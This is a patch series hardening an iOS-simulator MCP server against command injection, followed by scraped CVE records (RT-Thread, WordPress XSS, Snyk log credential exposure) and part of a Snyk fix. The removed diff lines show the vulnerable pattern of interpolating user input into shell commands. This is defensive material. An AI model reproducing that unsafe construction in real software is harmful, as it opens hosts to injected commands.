+          "--udid",
+          actualUdid,
+          "--json",
+          "--nested",
+        ]);
 
         return {
           isError: false,
@@ -167,9 +196,14 @@ if (!isToolFiltered("ui_tap")) {
     "ui_tap",
     "Tap on the screen in the iOS Simulator",
     {
-      duration: z.string().optional().describe("Press duration"),
+      duration: z
+        .string()
+        .regex(/^\d+(\.\d+)?$/)
+        .optional()
+        .describe("Press duration"),
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
       x: z.number().describe("The x-coordinate"),
@@ -178,10 +212,19 @@ if (!isToolFiltered("ui_tap")) {
     async ({ duration, udid, x, y }) => {
       try {
         const actualUdid = await getBootedDeviceId(udid);
-        const durationArg = duration ? `--duration ${duration}` : "";
-        const { stderr } = await execAsync(
-          `idb ui tap --udid ${actualUdid} ${durationArg} ${x} ${y}  --json`
-        );
+
+        const args = [
+          "ui",
+          "tap",
+          "--udid",
+          actualUdid,
+          ...(duration ? ["--duration", duration] : []),
+          String(x),
+          String(y),
+          "--json",
+        ];
+
+        const { stderr } = await run("idb", args);
 
         if (stderr) throw new Error(stderr);
 
@@ -213,16 +256,22 @@ if (!isToolFiltered("ui_type")) {
     {
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
-      text: z.string().describe("Text to input"),
+      text: z
+        .string()
+        .max(500)
+        .regex(/^[\x20-\x7E]+$/)
+        .describe("Text to input"),
     },
     async ({ udid, text }) => {
       try {
         const actualUdid = await getBootedDeviceId(udid);
-        const { stderr } = await execAsync(
-          `idb ui text ${text} --udid ${actualUdid}`
-        );
+
+        const args = ["ui", "text", text, "--udid", actualUdid];
+
+        const { stderr } = await run("idb", args);
 
         if (stderr) throw new Error(stderr);
 
@@ -256,6 +305,7 @@ if (!isToolFiltered("ui_swipe")) {
     {
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
       x_start: z.number().describe("The starting x-coordinate"),
@@ -271,10 +321,21 @@ if (!isToolFiltered("ui_swipe")) {
     async ({ udid, x_start, y_start, x_end, y_end, delta }) => {
       try {
         const actualUdid = await getBootedDeviceId(udid);
-        const deltaArg = delta ? `--delta ${delta}` : "";
-        const { stderr } = await execAsync(
-          `idb ui swipe --udid ${actualUdid} ${deltaArg} ${x_start} ${y_start} ${x_end} ${y_end} --json`
-        );
+
+        const args = [
+          "ui",
+          "swipe",
+          "--udid",
+          actualUdid,
+          ...(delta ? ["--delta", String(delta)] : []),
+          String(x_start),
+          String(y_start),
+          String(x_end),
+          String(y_end),
+          "--json",
+        ];
+
+        const { stderr } = await run("idb", args);
 
         if (stderr) throw new Error(stderr);
 
@@ -306,6 +367,7 @@ if (!isToolFiltered("ui_describe_point")) {
     {
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
       x: z.number().describe("The x-coordinate"),
@@ -314,9 +376,18 @@ if (!isToolFiltered("ui_describe_point")) {
     async ({ udid, x, y }) => {
       try {
         const actualUdid = await getBootedDeviceId(udid);
-        const { stdout, stderr } = await execAsync(
-          `idb ui describe-point --udid ${actualUdid} ${x} ${y} --json`
-        );
+
+        const args = [
+          "ui",
+          "describe-point",
+          "--udid",
+          actualUdid,
+          String(x),
+          String(y),
+          "--json",
+        ];
+
+        const { stdout, stderr } = await run("idb", args);
 
         if (stderr) throw new Error(stderr);
 
@@ -362,10 +433,12 @@ if (!isToolFiltered("screenshot")) {
     {
       udid: z
         .string()
+        .regex(UDID_REGEX)
         .optional()
         .describe("Udid of target, can also be set with the IDB_UDID env var"),
       output_path: z
         .string()
+        .max(1024)
         .describe(
           "File path where the screenshot will be saved (if relative, ~/Downloads will be used as base directory)"
         ),
@@ -393,14 +466,14 @@ if (!isToolFiltered("screenshot")) {
         const actualUdid = await getBootedDeviceId(udid);
         const absolutePath = ensureAbsolutePath(output_path);
 
-        let command = `xcrun simctl io ${actualUdid} screenshot ${absolutePath}`;
+        const args = ["simctl", "io", actualUdid, "screenshot", absolutePath];
 
-        if (type) command += ` --type=${type}`;
-        if (display) command += ` --display=${display}`;
-        if (mask) command += ` --mask=${mask}`;
+        if (type) args.push(`--type=${type}`);
+        if (display) args.push(`--display=${display}`);
+        if (mask) args.push(`--mask=${mask}`);
 
         // command is weird, it responds with stderr on success and stdout is blank
-        const { stderr: stdout } = await execAsync(command);
+        const { stderr: stdout } = await run("xcrun", args);
 
         // throw if we don't get the expected success message
         if (stdout && !stdout.includes("Wrote screenshot to")) {
@@ -440,6 +513,7 @@ if (!isToolFiltered("record_video")) {
     {
       output_path: z
         .string()
+        .max(1024)
         .optional()
         .describe(
           `Optional output path (defaults to ~/Downloads/simulator_recording_$DATE.mp4)`
@@ -543,7 +617,7 @@ if (!isToolFiltered("stop_recording")) {
     {},
     async () => {
       try {
-        await execAsync('pkill -SIGINT -f "simctl.*recordVideo"');
+        await run("pkill", ["-SIGINT", "-f", "simctl.*recordVideo"]);
 
         // Wait a moment for the video to finalize
         await new Promise((resolve) => setTimeout(resolve, 1000));

From f775902da4751877d718f081a9343cababc591ae Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 16:13:40 -0700
Subject: [PATCH 2/7] feat: enhance command argument handling by adding `--`
 separator and `--json` option for improved safety and clarity

---
 src/index.ts | 30 ++++++++++++++++++++++++++----
 1 file changed, 26 insertions(+), 4 deletions(-)

diff --git a/src/index.ts b/src/index.ts
index da329e3..b7b830d 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -219,9 +219,13 @@ if (!isToolFiltered("ui_tap")) {
           "--udid",
           actualUdid,
           ...(duration ? ["--duration", duration] : []),
+          "--json",
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
           String(x),
           String(y),
-          "--json",
         ];
 
         const { stderr } = await run("idb", args);
@@ -269,7 +273,17 @@ if (!isToolFiltered("ui_type")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const args = ["ui", "text", text, "--udid", actualUdid];
+        const args = [
+          "ui",
+          "text",
+          "--udid",
+          actualUdid,
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
+          text,
+        ];
 
         const { stderr } = await run("idb", args);
 
@@ -328,11 +342,15 @@ if (!isToolFiltered("ui_swipe")) {
           "--udid",
           actualUdid,
           ...(delta ? ["--delta", String(delta)] : []),
+          "--json",
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
           String(x_start),
           String(y_start),
           String(x_end),
           String(y_end),
-          "--json",
         ];
 
         const { stderr } = await run("idb", args);
@@ -382,9 +400,13 @@ if (!isToolFiltered("ui_describe_point")) {
           "describe-point",
           "--udid",
           actualUdid,
+          "--json",
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
           String(x),
           String(y),
-          "--json",
         ];
 
         const { stdout, stderr } = await run("idb", args);

From 8bed8a04722df4ccd34adf7813789dea0854925f Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 16:15:19 -0700
Subject: [PATCH 3/7] refactor: streamline command execution by directly
 passing arguments to `run` function, improving code clarity

---
 src/index.ts | 24 ++++++++----------------
 1 file changed, 8 insertions(+), 16 deletions(-)

diff --git a/src/index.ts b/src/index.ts
index b7b830d..e9393d1 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -213,7 +213,7 @@ if (!isToolFiltered("ui_tap")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const args = [
+        const { stderr } = await run("idb", [
           "ui",
           "tap",
           "--udid",
@@ -226,9 +226,7 @@ if (!isToolFiltered("ui_tap")) {
           "--",
           String(x),
           String(y),
-        ];
-
-        const { stderr } = await run("idb", args);
+        ]);
 
         if (stderr) throw new Error(stderr);
 
@@ -273,7 +271,7 @@ if (!isToolFiltered("ui_type")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const args = [
+        const { stderr } = await run("idb", [
           "ui",
           "text",
           "--udid",
@@ -283,9 +281,7 @@ if (!isToolFiltered("ui_type")) {
           // This prevents the shell from misinterpreting the arguments as options.
           "--",
           text,
-        ];
-
-        const { stderr } = await run("idb", args);
+        ]);
 
         if (stderr) throw new Error(stderr);
 
@@ -336,7 +332,7 @@ if (!isToolFiltered("ui_swipe")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const args = [
+        const { stderr } = await run("idb", [
           "ui",
           "swipe",
           "--udid",
@@ -351,9 +347,7 @@ if (!isToolFiltered("ui_swipe")) {
           String(y_start),
           String(x_end),
           String(y_end),
-        ];
-
-        const { stderr } = await run("idb", args);
+        ]);
 
         if (stderr) throw new Error(stderr);
 
@@ -395,7 +389,7 @@ if (!isToolFiltered("ui_describe_point")) {
       try {
         const actualUdid = await getBootedDeviceId(udid);
 
-        const args = [
+        const { stdout, stderr } = await run("idb", [
           "ui",
           "describe-point",
           "--udid",
@@ -407,9 +401,7 @@ if (!isToolFiltered("ui_describe_point")) {
           "--",
           String(x),
           String(y),
-        ];
-
-        const { stdout, stderr } = await run("idb", args);
+        ]);
 
         if (stderr) throw new Error(stderr);
 

From 0deec03d8f7afb6634212969fc8024870b96ac6e Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 16:19:59 -0700
Subject: [PATCH 4/7] refactor: improve command argument handling in screenshot
 and video recording functions by utilizing spread syntax and adding `--`
 separator for clarity

---
 src/index.ts | 47 +++++++++++++++++++++++++++++------------------
 1 file changed, 29 insertions(+), 18 deletions(-)

diff --git a/src/index.ts b/src/index.ts
index e9393d1..8a9a680 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -480,14 +480,21 @@ if (!isToolFiltered("screenshot")) {
         const actualUdid = await getBootedDeviceId(udid);
         const absolutePath = ensureAbsolutePath(output_path);
 
-        const args = ["simctl", "io", actualUdid, "screenshot", absolutePath];
-
-        if (type) args.push(`--type=${type}`);
-        if (display) args.push(`--display=${display}`);
-        if (mask) args.push(`--mask=${mask}`);
-
         // command is weird, it responds with stderr on success and stdout is blank
-        const { stderr: stdout } = await run("xcrun", args);
+        const { stderr: stdout } = await run("xcrun", [
+          "simctl",
+          "io",
+          actualUdid,
+          "screenshot",
+          ...(type ? [`--type=${type}`] : []),
+          ...(display ? [`--display=${display}`] : []),
+          ...(mask ? [`--mask=${mask}`] : []),
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
+          absolutePath,
+        ]);
 
         // throw if we don't get the expected success message
         if (stdout && !stdout.includes("Wrote screenshot to")) {
@@ -562,18 +569,22 @@ if (!isToolFiltered("record_video")) {
         const defaultFileName = `simulator_recording_${Date.now()}.mp4`;
         const outputFile = ensureAbsolutePath(output_path ?? defaultFileName);
 
-        // Build command arguments array
-        const args = ["simctl", "io", "booted", "recordVideo"];
-
-        if (codec) args.push(`--codec=${codec}`);
-        if (display) args.push(`--display=${display}`);
-        if (mask) args.push(`--mask=${mask}`);
-        if (force) args.push("--force");
-
-        args.push(outputFile);
-
         // Start the recording process
-        const recordingProcess = spawn("xcrun", args);
+        const recordingProcess = spawn("xcrun", [
+          "simctl",
+          "io",
+          "booted",
+          "recordVideo",
+          ...(codec ? [`--codec=${codec}`] : []),
+          ...(display ? [`--display=${display}`] : []),
+          ...(mask ? [`--mask=${mask}`] : []),
+          ...(force ? ["--force"] : []),
+          // When passing user-provided values to a command, it's crucial to use `--`
+          // to separate the command's options from positional arguments.
+          // This prevents the shell from misinterpreting the arguments as options.
+          "--",
+          outputFile,
+        ]);
 
         // Wait for recording to start
         await new Promise((resolve, reject) => {

From 34b9f0236b2d948b13c1737bae343ec8875e4d15 Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 16:44:56 -0700
Subject: [PATCH 5/7] docs: add Quality Assurance guide with manual test cases
 for the Photos app

---
 QA.md | 23 +++++++++++++++++++++++
 1 file changed, 23 insertions(+)
 create mode 100644 QA.md

diff --git a/QA.md b/QA.md
new file mode 100644
index 0000000..03433be
--- /dev/null
+++ b/QA.md
@@ -0,0 +1,23 @@
+# Quality Assurance
+
+This guide contains manual quality assurance tests to make sure all the tools in this MCP server is functional on release.
+
+You can run a test case copy and pasting the test case into a chat in an MCP client (like Cursor) that can run MCP tools.
+
+## Test Case: Photos app
+
+1. Have the user open the native Photo app in the iOS simulator.
+2. Call `get_booted_sim_id` to get the UDID of the booted simulator.
+3. Call `record_video` to start recording a screen recording of the test.
+4. Call `ui_describe_all` to make sure we are on the All Photos tab.
+5. Call `ui_describe_point` to find the x and y coordinates for tapping the Search tab button.
+6. Call `ui_tap` to tap the Search tab button.
+7. Call `ui_tap` to focus on the Search text input.
+8. Call `ui_type` to type "Photos" into the Search text input.
+9. Call `ui_describe_all` to describe the page and find the first photo result.
+10. Call `ui_describe_point` to find the x and y coordinates for the first photo result touchable area.
+11. Call `ui_tap` to tap the coordinates of the first photo result touchable area
+12. Call `ui_swipe` to swipe right to left in the center of the screen.
+13. Call `ui_describe_all` to describe the page and see we are on the next photo result.
+14. Call `screenshot` to take a screenshot of the current page.
+15. Call `stop_recording` to stop the screen recording.

From 4850a392813ff2a8839ed5c930e31e60574a87f3 Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 16:56:33 -0700
Subject: [PATCH 6/7] docs: update QA.md to clarify swipe action for dismissing
 photos and returning to All Photos tab

---
 QA.md | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/QA.md b/QA.md
index 03433be..30d9069 100644
--- a/QA.md
+++ b/QA.md
@@ -17,7 +17,7 @@ You can run a test case copy and pasting the test case into a chat in an MCP cli
 9. Call `ui_describe_all` to describe the page and find the first photo result.
 10. Call `ui_describe_point` to find the x and y coordinates for the first photo result touchable area.
 11. Call `ui_tap` to tap the coordinates of the first photo result touchable area
-12. Call `ui_swipe` to swipe right to left in the center of the screen.
-13. Call `ui_describe_all` to describe the page and see we are on the next photo result.
+12. Call `ui_swipe` to swipe from the center of the screen down to dismiss the photo and go back to the All Photos tab.
+13. Call `ui_describe_all` to describe the page and see we are the All Photos tab.
 14. Call `screenshot` to take a screenshot of the current page.
 15. Call `stop_recording` to stop the screen recording.

From 73a78fbf499926457316ed32f7e85db04f0d591a Mon Sep 17 00:00:00 2001
From: Joshua Yoes <37849890+joshuayoes@users.noreply.github.com>
Date: Thu, 19 Jun 2025 17:07:44 -0700
Subject: [PATCH 7/7] docs: update SECURITY.md to reflect change in command
 injection vulnerability severity from High to Moderate

---
 SECURITY.md | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/SECURITY.md b/SECURITY.md
index b59633a..55af823 100644
--- a/SECURITY.md
+++ b/SECURITY.md
@@ -15,7 +15,7 @@ currently being supported with security updates.
 ### Command Injection (Fixed in v1.3.3)
 
 **CVE**: To be assigned  
-**Severity**: High  
+**Severity**: Moderate  
 **Fixed in**: v1.3.3 (2025)
 
 **Description**: Previous versions contained command injection vulnerabilities in several MCP tools (ui_tap, ui_type, ui_swipe, ui_describe_point, ui_describe_all, screenshot, record_video, stop_recording) due to unsafe shell command construction using string interpolation.


================================================================================


CVE ID: CVE-2025-6693
Published: 2025-06-26T13:15:29.593
Modified: 2025-07-11T14:27:37.840
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

Description:
A vulnerability, which was classified as critical, was found in RT-Thread up to 5.1.0. This affects the function sys_device_open/sys_device_read/sys_device_control/sys_device_init/sys_device_close/sys_device_write of the file components/drivers/core/device.c. The manipulation leads to memory corruption. It is possible to launch the attack on the local host. The vendor was contacted early about this disclosure but did not respond in any way.

References (9):
  1. https://github.com/RT-Thread/rt-thread/issues/10387 [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.313959 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313959 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.595813 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.595814 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.595827 [Third Party Advisory, VDB Entry]
  7. https://vuldb.com/?submit.595869 [Third Party Advisory, VDB Entry]
  8. https://vuldb.com/?submit.595870 [Third Party Advisory, VDB Entry]
  9. https://vuldb.com/?submit.595871 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313959 ---
sys_device_open/sys_device_read/sys_device_control/sys_device_init/sys_device_close/sys_device_write

sys_device_open/sys_device_read/sys_device_control/sys_device_init/sys_device_close/sys_device_write

================================================================================


CVE ID: CVE-2025-5842
Published: 2025-06-26T10:15:25.537
Modified: 2025-07-08T11:35:12.807
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Modern Design Library plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘class’ parameter in all versions up to, and including, 1.1.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (4):
  1. https://plugins.trac.wordpress.org/browser/mdl-shortcodes/trunk/mdl-shortcodes.php#L197 [Product]
  2. https://plugins.trac.wordpress.org/changeset/3317171/ [Patch]
  3. https://wordpress.org/plugins/mdl-shortcodes/#developers [Product, Release Notes]
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/1be519d5-b505-4b5d-9f14-c8544e8f8298?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/mdl-shortcodes/#developers ---
wp-content/plugins/

================================================================================


CVE ID: CVE-2025-5338
Published: 2025-06-26T10:15:25.307
Modified: 2025-07-08T11:34:52.400
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Royal Elementor Addons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via multiple widgets in all versions up to, and including, 1.7.1024 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (4):
  1. https://plugins.trac.wordpress.org/browser/royal-elementor-addons/tags/1.7.1022/assets/js/frontend.js [Product]
  2. https://plugins.trac.wordpress.org/changeset/3309082/ [Patch]
  3. https://wordpress.org/plugins/royal-elementor-addons/#developers [Product, Release Notes]
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/201ff7b6-d72a-43c3-a7b1-c4f917c9d27f?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/royal-elementor-addons/#developers ---
/wp-content/plugins/royal-elementor-addons

================================================================================


CVE ID: CVE-2025-6624
Published: 2025-06-26T05:15:23.820
Modified: 2025-07-09T17:53:54.783
CVSS Score: 7.2 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-532: CWE-532
  - CWE-532: CWE-532

Description:
Versions of the package snyk before 1.1297.3 are vulnerable to Insertion of Sensitive Information into Log File through local Snyk CLI debug logs. Container Registry credentials provided via environment variables or command line arguments can be exposed when executing Snyk CLI in DEBUG or DEBUG/TRACE mode.

The issue affects the following Snyk commands:

1. When snyk container test or snyk container monitor commands are run against a container registry, with debug mode enabled, the container registry credentials may be written into the local Snyk CLI debug log. This only happens with credentials specified in environment variables (SNYK_REGISTRY_USERNAME and SNYK_REGISTRY_PASSWORD), or in the CLI (--password/-p and  --username/-u).

2. When snyk auth command is executed with debug mode enabled AND the log level is set to TRACE, the Snyk access / refresh credential tokens used to connect the CLI to Snyk may be written into the local CLI debug logs.

3. When snyk iac test is executed with a Remote IAC Custom rules bundle, debug mode enabled, AND the log level is set to TRACE, the docker registry token may be written into the local CLI debug logs.

References (5):
  1. https://docs.snyk.io/snyk-cli/debugging-the-snyk-cli [Technical Description]
  2. https://github.com/snyk/cli/commit/38322f377da7e5f1391e1f641710be50989fa4df [Patch]
  3. https://github.com/snyk/cli/releases/tag/v1.1297.3 [Release Notes]
  4. https://github.com/snyk/go-application-framework/commit/ca7ba7d72e68455afb466a7a47bb2c9aece86c18 [Patch]
  5. https://security.snyk.io/vuln/SNYK-JS-SNYK-10497607 [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/snyk/cli/commit/38322f377da7e5f1391e1f641710be50989fa4df ---
From 38322f377da7e5f1391e1f641710be50989fa4df Mon Sep 17 00:00:00 2001
From: Lucian R <lucian.rosu@snyk.io>
Date: Thu, 19 Jun 2025 19:18:51 +0300
Subject: [PATCH] fix(logging): Improve the sanitization of credentials in
 local debug logs

---
 binary-releases/RELEASE_NOTES.md       |   7 +-
 cliv2/go.mod                           |   2 +-
 cliv2/go.sum                           |   4 +-
 cliv2/internal/cliv2/cliv2.go          |   2 +-
 cliv2/pkg/basic_workflows/legacycli.go |   1 -
 src/cli/args.ts                        |   5 --
 test/jest/acceptance/debuglog.spec.ts  | 118 +++++++++++++++++++++++--
 ts-binary-wrapper/src/common.ts        |   4 +-
 8 files changed, 118 insertions(+), 25 deletions(-)

diff --git a/binary-releases/RELEASE_NOTES.md b/binary-releases/RELEASE_NOTES.md
index 0691c7b2c2..8e43f2abbb 100644
--- a/binary-releases/RELEASE_NOTES.md
+++ b/binary-releases/RELEASE_NOTES.md
@@ -1,10 +1,7 @@
-## [1.1297.2](https://github.com/snyk/snyk/compare/v1.1297.1...1.1297.2) (2025-06-16)
+## [1.1297.3](https://github.com/snyk/snyk/compare/v1.1297.2...1.1297.3) (2025-06-23)
 
 The Snyk CLI is being deployed to different deployment channels, users can select the stability level according to their needs. For details please see [this documentation](https://docs.snyk.io/snyk-cli/releases-and-channels-for-the-snyk-cli)
 
 ### Bug Fixes
 
-* **logging:** Improves the sanitization of credentials in local debug logs. ([e054455](https://github.com/snyk/snyk/commit/e054455eab8e686f19c165a8bad86259103a5f5d))
-* **language-server:** IDE Connectivity for Proxy Users: Fixes an issue where IDE plugins could fail to connect when operating behind an NTLM proxy.
-* **language-server:** Snyk Code Local Engine Fix: Addresses a regression that prevented the Snyk Code Local Engine (SCLE) from functioning correctly within the IDEs.
-
+* **logging:** Improves the sanitization of credentials in local debug logs. ([e50fb22](https://github.com/snyk/snyk/commit/e50fb22cde76b3ca01e6a21d5495534c06586df9))
\ No newline at end of file
diff --git a/cliv2/go.mod b/cliv2/go.mod
index 82069374b7..cad1ac3e91 100644
--- a/cliv2/go.mod
+++ b/cliv2/go.mod
@@ -16,7 +16,7 @@ require (
 	github.com/snyk/cli-extension-sbom v0.0.0-20250422133603-a5ae6fdf0934
 	github.com/snyk/container-cli v0.0.0-20250321132345-1e2e01681dd7
 	github.com/snyk/error-catalog-golang-public v0.0.0-20250429130542-564b0605020e
-	github.com/snyk/go-application-framework v0.0.0-20250612130357-31093e6eb8ad
+	github.com/snyk/go-application-framework v0.0.0-20250623124518-ca7ba7d72e68
 	github.com/snyk/go-httpauth v0.0.0-20240307114523-1f5ea3f55c65
 	github.com/snyk/snyk-iac-capture v0.6.5
 	github.com/snyk/snyk-ls v0.0.0-20250613113919-2b232b9d448d
diff --git a/cliv2/go.sum b/cliv2/go.sum
index c10a3db895..5b26a6940a 100644
--- a/cliv2/go.sum
+++ b/cliv2/go.sum
@@ -808,8 +808,8 @@ github.com/snyk/container-cli v0.0.0-20250321132345-1e2e01681dd7 h1:/2+2piwQtB9f
 github.com/snyk/container-cli v0.0.0-20250321132345-1e2e01681dd7/go.mod h1:38w+dcAQp9eG3P5t2eNS9eG0reut10AeJjLv5lJ5lpM=
 github.com/snyk/error-catalog-golang-public v0.0.0-20250429130542-564b0605020e h1:XFGkHDWA8JTPLr82QzoKVqGytofEYBf68VqoUq8yvXk=
 github.com/snyk/error-catalog-golang-public v0.0.0-20250429130542-564b0605020e/go.mod h1:Ytttq7Pw4vOCu9NtRQaOeDU2dhBYUyNBe6kX4+nIIQ4=
-github.com/snyk/go-application-framework v0.0.0-20250612130357-31093e6eb8ad h1:RpUp1oayxILiWL6jGnXgAYiz7E44minwFEeDXJU3Xc0=
-github.com/snyk/go-application-framework v0.0.0-20250612130357-31093e6eb8ad/go.mod h1:Hy8dugDhTPRPe99Bf4mG7zeh7+OobdWfX5dzhbeQQsU=
+github.com/snyk/go-application-framework v0.0.0-20250623124518-ca7ba7d72e68 h1:eTR15PecAEX3F9HvptgPWI1Z936qirRoIGCiK3kALfU=
+github.com/snyk/go-application-framework v0.0.0-20250623124518-ca7ba7d72e68/go.mod h1:Hy8dugDhTPRPe99Bf4mG7zeh7+OobdWfX5dzhbeQQsU=
 github.com/snyk/go-httpauth v0.0.0-20240307114523-1f5ea3f55c65 h1:CEQuYv0Go6MEyRCD3YjLYM2u3Oxkx8GpCpFBd4rUTUk=
 github.com/snyk/go-httpauth v0.0.0-20240307114523-1f5ea3f55c65/go.mod h1:88KbbvGYlmLgee4OcQ19yr0bNpXpOr2kciOthaSzCAg=
 github.com/snyk/policy-engine v0.33.2 h1:ZxD6/RQ4vqUAXa64V72SsGjZ8vmnBgZNGYQxMIqctYo=
diff --git a/cliv2/internal/cliv2/cliv2.go b/cliv2/internal/cliv2/cliv2.go
index 22ef6b04e3..8b61406d65 100644
--- a/cliv2/internal/cliv2/cliv2.go
+++ b/cliv2/internal/cliv2/cliv2.go
@@ -427,7 +427,7 @@ func (c *CLI) executeV1Default(proxyInfo *proxy.ProxyInfo, passThroughArgs []str
 		c.DebugLogger.Println("Launching: ")
 		c.DebugLogger.Println("  ", c.v1BinaryLocation)
 		c.DebugLogger.Println(" With Arguments:")
-		c.DebugLogger.Println("  ", strings.Join(passThroughArgs, ", "))
+		c.DebugLogger.Println(" ", strings.Join(passThroughArgs, " "))
 		c.DebugLogger.Println(" With Environment: ")
 
 		variablesMap := utils.ToKeyValueMap(snykCmd.Env, "=")
diff --git a/cliv2/pkg/basic_workflows/legacycli.go b/cliv2/pkg/basic_workflows/legacycli.go
index 08b1790698..e9725eb470 100644
--- a/cliv2/pkg/basic_workflows/legacycli.go
+++ b/cliv2/pkg/basic_workflows/legacycli.go
@@ -84,7 +84,6 @@ func legacycliWorkflow(
 	proxyAuthenticationMechanism := httpauth.AuthenticationMechanismFromString(proxyAuthenticationMechanismString)
 	analyticsDisabled := config.GetBool(configuration.ANALYTICS_DISABLED)
 
-	debugLogger.Print("Arguments:", args)
 	debugLogger.Print("Use StdIO:", useStdIo)
 	debugLogger.Print("Working directory:", workingDirectory)
 
diff --git a/src/cli/args.ts b/src/cli/args.ts
index 19697c5063..7a6c4f48fe 100644
--- a/src/cli/args.ts
+++ b/src/cli/args.ts
@@ -8,7 +8,6 @@ import {
   SupportedUserReachableFacingCliArgs,
 } from '../lib/types';
 import { getContainerImageSavePath } from '../lib/container';
-import { obfuscateArgs } from '../lib/utils';
 
 export declare interface Global extends NodeJS.Global {
   ignoreUnknownCA: boolean;
@@ -119,8 +118,6 @@ export function args(rawArgv: string[]): Args {
     debugModule.enable(enable);
   }
 
-  const debug = debugModule('snyk');
-
   // Late require, see the note re "debug" option above.
   const cli = require('./commands');
 
@@ -273,8 +270,6 @@ export function args(rawArgv: string[]): Args {
     global.ignoreUnknownCA = true;
   }
 
-  debug(command, obfuscateArgs(argv));
-
   return {
     command,
     method,
diff --git a/test/jest/acceptance/debuglog.spec.ts b/test/jest/acceptance/debuglog.spec.ts
index 3b46b96d26..d33cee0b69 100644
--- a/test/jest/acceptance/debuglog.spec.ts
+++ b/test/jest/acceptance/debuglog.spec.ts
@@ -4,7 +4,7 @@ import {
   createProjectFromWorkspace,
 } from '../util/createProject';
 
-jest.setTimeout(1000 * 60);
+jest.setTimeout(10000 * 60);
 
 describe('debug log', () => {
   it('redacts token from env var', async () => {
@@ -48,7 +48,85 @@ describe('debug log', () => {
 
   it('redacts basic authentication', async () => {
     const { stderr } = await runSnykCLI(
-      'container test ubuntu:latest --username=us --password=pw -d',
+      'container test ubuntu:latest --username=john.doe@domain.org --password=solidpassword -d',
+      {
+        env: {
+          ...process.env,
+          SNYK_DISABLE_ANALYTICS: '1',
+        },
+      },
+    );
+
+    expect(stderr).not.toContain('Basic am9ob');
+    expect(stderr).toContain('Basic ***');
+
+    expect(stderr).not.toContain('john.doe@domain.org');
+    expect(stderr).not.toContain('solidpassword');
+  });
+
+  it('redacts short-form basic authentication', async () => {
+    const { stderr } = await runSnykCLI(
+      'container test ubuntu:latest -u=john.doe@domain.org -p=solidpassword -d',
+      {
+        env: {
+          ...process.env,
